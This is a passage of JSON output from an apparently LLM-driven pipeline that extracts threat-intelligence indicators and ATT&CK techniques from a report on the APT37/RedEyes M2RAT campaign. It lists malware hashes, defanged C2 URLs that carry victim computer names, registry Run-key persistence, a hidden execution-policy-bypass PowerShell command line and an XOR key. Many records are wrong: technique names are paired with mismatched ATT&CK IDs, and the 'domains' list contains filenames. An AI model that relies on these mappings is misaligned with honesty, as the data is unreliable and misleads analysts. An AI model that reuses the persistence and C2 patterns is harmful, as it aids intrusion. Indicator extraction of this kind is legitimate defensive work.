4488c709970833b5043c0b0ea2ec9fa9 // M2RAT   Trojan/Win.M2RAT.C5357519 (2023.01.14.01) 7f5a72be826ea2fe5f11a16da0178e54 // Mobile phone data theft   Infostealer/Win.Phone.C5381667 (2023.02.14.03) 5. References Categories:Malware Information Tagged as:APT37 M2RAT MaptoRAT RedEyes ScarCruft",
            "commands": [
              "Powershell and the normal Windows utility, mshta,",
              "Powershell and executed. The result",
              "Powershell and the Chinotto malware to steal PC information and remote",
              "cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping",
              "Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with",
              "cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep",
              "Powershell script \u2013 Downloader/PS.Generic.SC185661 (2023.01.16.03) 4488c709970833b5043c0b0ea2ec9fa9 // M2RAT \u2013 Trojan/Win.M2RAT.C5357519 (2023.01.14.01) 7f5a72be826ea2fe5f11a16da0178e54 // Mobile phone data theft \u2013 Infostealer/Win.Phone.C5381667 (2023.02.14.03)",
              "Powershell code",
              "Powershell adds a \u201cU\u201d parameter to the threat actor\u2019s server address when transmitting the computer name",
              "Powershell command, which receives and executes commands from the"
            ],
            "file_paths": [
              "/Win.M2RAT.C5357519",
              "c:\\windows\\system32\\cmd.exe",
              "/PS.Generic.SC185661",
              "/www.*******elearning.or[.]kr/popup/handle/log.php?U=[Computer",
              "E:\\MyWork\\PhoneDataCp\\PhoneDeviceManager\\PhoneDeviceManager\\obj\\x86\\Release\\PhoneDeviceManager.pdb",
              "/EPS.Generic",
              "/Win.Loader.C5359534",
              "A:\\",
              "/www.*******elearning.or[.]kr/popup/handle/1.html",
              "/Win.Phone.C5381667",
              "/",
              "/BIN.Agent",
              "/www.*******elearning.or[.]kr/popup/handle/log.php?R=[BASE64-encoded]",
              "/[redacted].cafe24[.]com/bbs/probook/1.html",
              "/www.*****elearning.or[.]kr/popup/handle/1.html"
            ],
            "registry_keys": [
              "HKCU\\Software\\OneDriver",
              "HKCU\\Software\\OneDriver\u201d",
              "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            ]
          },
          "entities": {
            "malware": [
              "APT",
              "Malware",
              "Trojan",
              "backdoor",
              "downloader",
              "loader",
              "rat"
            ],
            "tools": [
              "Powershell",
              "Sc",
              "at",
              "cmd",
              "mshta",
              "net",
              "ping",
              "reg"
            ],
            "threat_actors": [
              "APT37"
            ],
            "ips": [
              "2.2.2.2"
            ],
            "domains": [
              "1.html",
              "BIN.Agent",
              "EPS.Generic",
              "Form.hwp",
              "PS.Generic",
              "PhoneDeviceManager.pdb",
              "PowerShell.exe",
              "RAR.exe",
              "Win.Loader",
              "Win.Phone",
              "asec.ahnlab.com",
              "cmd.exe",
              "elearning.or",
              "explorer.exe",
              "log.php",
              "lskdjfel.exe",
              "wallup.net"
            ],
            "hashes": {
              "md5": [
                "4488c709970833b5043c0b0ea2ec9fa9",
                "7bab405fbc6af65680443ae95c30595d",
                "7f5a72be826ea2fe5f11a16da0178e54",
                "8b666fc04af6de45c804d973583c76e0",
                "9083c1ff01ad8fabbcd8af1b63b77e66"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Exploit Public-Facing Application"
            ],
            "execution": [
              "PowerShell",
              "Command and Scripting Interpreter"
            ],
            "persistence": [
              "Registry Run Keys"
            ],
            "defense_evasion": [
              "Obfuscated Files or Information",
              "Process Injection"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "**Observed Commands:**\n- Powershell and the normal Windows utility, mshta,\n- Powershell and executed. The result\n- Powershell and the Chinotto malware to steal PC information and remote\n- cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping\n- Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with\n\n**File System Activity:**\n- /Win.M2RAT.C5357519\n- c:\\windows\\system32\\cmd.exe\n- /PS.Generic.SC185661\n- /www.*******elearning.or[.]kr/popup/handle/log.php?U=[Computer\n- E:\\MyWork\\PhoneDataCp\\PhoneDeviceManager\\PhoneDeviceManager\\obj\\x86\\Release\\PhoneDeviceManager.pdb\n\n**Registry Modifications:**\n- HKCU\\Software\\OneDriver\n- HKCU\\Software\\OneDriver\u201d\n- HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n**Network Indicators:**\n- Form.hwp\n- PhoneDeviceManager.pdb\n- Win.Loader\n- 2.2.2.2\n- elearning.or\n- log.php\n- BIN.Agent\n- RAR.exe\n- Win.Phone\n- PowerShell.exe\n\n**Key Security Terms:** evasion, exploitation, cmd, terminate, process, malware, persistence, inject, powershell, create"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 13.712,
          "llm_processing_time_ms": 5643.351
        }
      }
    ],
    "results": [
      {
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "extracted_ttps": [
          {
            "ttp_id": "3b7476bd-489c-4da2-83ad-1cef12d37369",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Shared Memory",
            "attack_id": "T1497",
            "tactic": "Defense Evasion",
            "description": "M2RAT creates a shared memory section to execute commands from the threat actor's server",
            "confidence_score": 0.739,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.359,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "shared memory"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f559214e-3b38-46b2-a4b5-96a0de70cf6b",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Steganography",
            "attack_id": "T1091",
            "tactic": "Defense Evasion",
            "description": "The threat actor used steganography to embed malware within an image file",
            "confidence_score": 0.738,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "wallup.net",
              "JPEG image file",
              "XOR key: FD DD 28 F5 7C 48 8E 7E 0C E0 17 77 35 87 3B 49"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "Steganography tool",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cf50d4fe-5d77-4fdc-b0b9-01462057044f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "MSHTA",
            "attack_id": "T1170",
            "tactic": "Execution",
            "description": "The threat actor used mshta to execute an HTA file containing JavaScript code",
            "confidence_score": 0.736,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "mshta.exe",
              "hxxps://www.*****elearning.or[.]kr/popup/handle/1.html"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c41fae42-2f07-4d24-bab8-0f03ce91002a",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Autorun Registration",
            "attack_id": "T1060",
            "tactic": "Persistence",
            "description": "The RedEyes group used the RUN key command for autorun registration to establish a consistent connection with the C&C server",
            "confidence_score": 0.724,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.46,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RUN key command"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4cd8f8db-9bf3-4798-94ba-c125c88d4ff4",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "M2RAT's C&C communications command system involves receiving commands from the threat actor's server through the POST method's Body",
            "confidence_score": 0.723,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?R=[BASE64-encoded]",
              "hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?U=[Computer Name]+[Username]"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "0efcb11f-8feb-46ca-a007-cd87167ab9d6",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exfiltration",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The RedEyes group exfiltrated PC information and mobile phone data of their targets",
            "confidence_score": 0.721,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PC information",
              "Mobile phone data"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "501d52b9-0d49-4c9d-8e77-4d7dd6028730",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Steganography",
            "attack_id": "T1091",
            "tactic": "Defense Evasion",
            "description": "The RedEyes group used steganography to hide malware in images",
            "confidence_score": 0.72,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Steganography technique"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "Steganography tool",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2e5022bb-149b-4b79-bedf-b642b8f5bbaa",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "The RedEyes group used PowerShell to steal PC information and remote control systems",
            "confidence_score": 0.72,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7baa8895-a7dd-49b0-8f06-b0ca97599a93",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Compression",
            "attack_id": "T1005",
            "tactic": "Exfiltration",
            "description": "Compressing files with Winrar (RAR.exe) for exfiltration",
            "confidence_score": 0.715,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 1.0,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RAR.exe",
              "%TEMP%\\Y_%m_%d_%H_%M_%S",
              "hwp",
              "doc",
              "docx",
              "xls",
              "xlsx",
              "ppt",
              "pptx",
              "cell",
              "csv",
              "show",
              "hsdt",
              "mp3",
              "amr",
              "3gp",
              "m4a",
              "txt",
              "png",
              "jpg",
              "jpeg",
              "gif",
              "pdf",
              "eml"
            ],
            "tools": [
              "reg",
              "ping",
              "Winrar",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b5bde009-2ab2-4b2b-9b93-5a15aeddc1ce",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Control",
            "attack_id": "T1094",
            "tactic": "Command and Control",
            "description": "The RedEyes group used the newly identified M2RAT malware to carry out C&C commands",
            "confidence_score": 0.709,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "M2RAT malware",
              "Shared memory section"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c59fb50b-21d5-43d4-88a8-b71595b7d23d",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Keylogging",
            "attack_id": "T1056",
            "tactic": "Credential Access",
            "description": "The M2RAT backdoor includes keylogging features",
            "confidence_score": 0.706,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "keylogging data"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ea8dd512-3b9e-4e19-b268-3ab9874d2af4",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Steganography",
            "attack_id": "T1091",
            "tactic": "Defense Evasion",
            "description": "Attacker used steganography in JPEG files",
            "confidence_score": 0.706,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "93c66ee424daf4c5590e21182592672e"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "Steganography JPEG",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "18eb44e6-4b76-4da4-a8f4-305c8a04e9a7",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Infostealer",
            "attack_id": "T1005",
            "tactic": "Collection",
            "description": "Attacker used Infostealer/Win.Phone.C5381667 for mobile phone data theft",
            "confidence_score": 0.698,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "7f5a72be826ea2fe5f11a16da0178e54"
            ],
            "tools": [
              "Infostealer/Win.Phone.C5381667",
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "12008d8a-8756-4f4d-945c-734c30091104",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Scheduled Task/Job",
            "attack_id": "T1053",
            "tactic": "Persistence",
            "description": "The threat actor registered a command to the registry Run key to establish a persistent connection",
            "confidence_score": 0.695,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
              "RyPO",
              "c:\\windows\\system32\\cmd.exe /c PowerShell.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a4a29854-b55f-4b44-b869-7d5d66cde2c9",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Obfuscation",
            "attack_id": "T1001",
            "tactic": "Defense Evasion",
            "description": "Threat actor uses steganography technique to evade network detection by hiding command info in the Body of the POST",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "steganography",
              "POST request"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c5c1a8d3-0535-4aad-bb31-860c60224402",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "Attacker used PowerShell for execution",
            "confidence_score": 0.692,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cf680435-9373-4d62-9793-41857d8a9731",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The threat actor exploited a vulnerability in the EPS processing module to execute shellcode",
            "confidence_score": 0.688,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.359,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CVE-2017-8291",
              "Form.hwp",
              "EPS file"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "dbaa6b49-038e-4ae4-9a69-45a6a42b578a",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The threat actor used PowerShell to execute commands and download additional malware",
            "confidence_score": 0.687,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PowerShell.exe",
              "-WindowStyle hidden",
              "-NoLogo",
              "-NonInteractive",
              "-ep bypass"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "66983c65-2c78-45f1-a62b-2a0b1486a798",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "Persistence-related Powershell code",
            "confidence_score": 0.685,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.069,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "49e5dc2c-4706-4407-ab33-883c316f9b0a",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "PowerShell",
            "attack_id": "T1086",
            "tactic": "Execution",
            "description": "Detected PowerShell activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "df00da9b-a60e-459d-8e87-4b68029e3146",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The CMD command is transmitted through the shared memory to execute remote control commands",
            "confidence_score": 0.682,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.359,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CMD",
              "shared memory"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "Chinotto malware",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a535d520-d18c-431c-af7c-3fda82a9b20d",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Trojan",
            "attack_id": "T1190",
            "tactic": "Execution",
            "description": "Attacker used Trojan/Win.Loader.C5359534",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.069,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "7bab405fbc6af65680443ae95c30595d"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "Trojan/Win.Loader.C5359534",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "eea1f088-8bc3-40e4-880a-d8f64a4e75b5",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Downloader",
            "attack_id": "T1105",
            "tactic": "Command and Control",
            "description": "Attacker used Downloader/PS.Generic.SC185661",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.069,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "9083c1ff01ad8fabbcd8af1b63b77e66"
            ],
            "tools": [
              "reg",
              "ping",
              "Downloader/PS.Generic.SC185661",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d1579ab7-d918-49fa-ac6e-38c8c5ab9ec0",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Defense Evasion",
            "description": "The threat actor encoded the CMD command in BASE64 before sending it to the affected host",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "BASE64 encoding"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1764d539-314d-4a4e-9b2c-76ca93a77313",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Exfiltration",
            "description": "The command execution result is encoded in BASE64 before sending it to the threat actor's server",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "BASE64-encoded"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2309b53e-4ff6-457d-941a-1ff0b5d4c3b0",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Download Malware-Tools",
            "attack_id": "T1215",
            "tactic": "Defense Evasion",
            "description": "The threat actor downloaded an image file containing malware from the threat actor's server",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "JPEG image file",
              "hxxps://www.*****elearning.or[.]kr/popup/handle/1.html"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d70e0a25-9c9f-4d9f-bdc1-a432539bcedd",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Exfiltration",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
